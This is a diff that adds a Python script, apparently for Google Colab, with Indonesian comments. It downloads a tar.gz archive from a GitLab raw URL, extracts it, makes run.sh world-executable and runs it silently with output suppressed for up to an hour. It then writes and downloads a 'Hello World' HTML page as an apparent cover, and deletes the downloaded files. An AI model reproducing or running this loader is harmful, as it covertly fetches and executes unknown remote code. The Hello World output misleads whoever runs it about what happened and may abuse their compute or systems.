@@ -1,0 +1,63 @@
+# ═══════════════════════════════════════════════════════════════
+URL_TAR_GZ = "https://gitlab.com/ganantarasans/files88/-/raw/main/xiaomi99.tar.gz"
+TARGET_DIR = "xiaomi99"
+TARGET_SCRIPT = "run.sh"
+RUN_ARGS = ""
+TIMEOUT = 3600
+# ═══════════════════════════════════════════════════════════════
+
+import os, sys, subprocess, tarfile, urllib.request, shutil, pathlib, warnings
+warnings.filterwarnings("ignore")
+
+# ── 1. Download ───────────────────────────────────────────────
+urllib.request.urlretrieve(URL_TAR_GZ, "project.tar.gz")
+
+# ── 2. Ekstrak ────────────────────────────────────────────────
+WORK = "work"
+if os.path.exists(WORK): shutil.rmtree(WORK)
+os.makedirs(WORK)
+with tarfile.open("project.tar.gz") as t:
+    try:    t.extractall(WORK, filter="data")
+    except TypeError: t.extractall(WORK)
+
+# ── 3. Cari target ────────────────────────────────────────────
+target_dir = None
+for root, dirs, files in os.walk(WORK):
+    if os.path.basename(root) == TARGET_DIR:
+        target_dir = root; break
+if not target_dir:
+    raise SystemExit(f"'{TARGET_DIR}' tidak ditemukan di arsip")
+
+script_path = os.path.join(target_dir, TARGET_SCRIPT)
+if not os.path.isfile(script_path):
+    raise SystemExit(f"'{TARGET_SCRIPT}' tidak ada di {target_dir}")
+
+# ── 4. chmod + jalankan (senyap) ──────────────────────────────
+os.chmod(script_path, 0o777)
+try:
+    subprocess.run(
+        ["./" + TARGET_SCRIPT] + RUN_ARGS.split(),
+        cwd=target_dir, capture_output=True, text=True,
+        timeout=TIMEOUT, stdin=subprocess.DEVNULL,
+    )
+except subprocess.TimeoutExpired:
+    pass
+
+# ── 5. index.html: Hello World saja ───────────────────────────
+pathlib.Path("index.html").write_text('''<!DOCTYPE html>
+<html lang="id"><head>
+<meta charset="utf-8"><title>Hello World</title>
+<style>
+  body{margin:0;height:100vh;display:flex;align-items:center;justify-content:center;
+       background:#0f1115;color:#4ade80;font-family:system-ui,sans-serif}
+  h1{font-size:3rem;margin:0;font-weight:700}
+</style></head>
+<body><h1>Hello World</h1></body></html>''')
+
+# ── 6. Unduh ──────────────────────────────────────────────────
+from google.colab import files
+files.download("index.html")
+
+# ── 7. Bersihkan ──────────────────────────────────────────────
+shutil.rmtree(WORK, ignore_errors=True)
+os.remove("project.tar.gz")
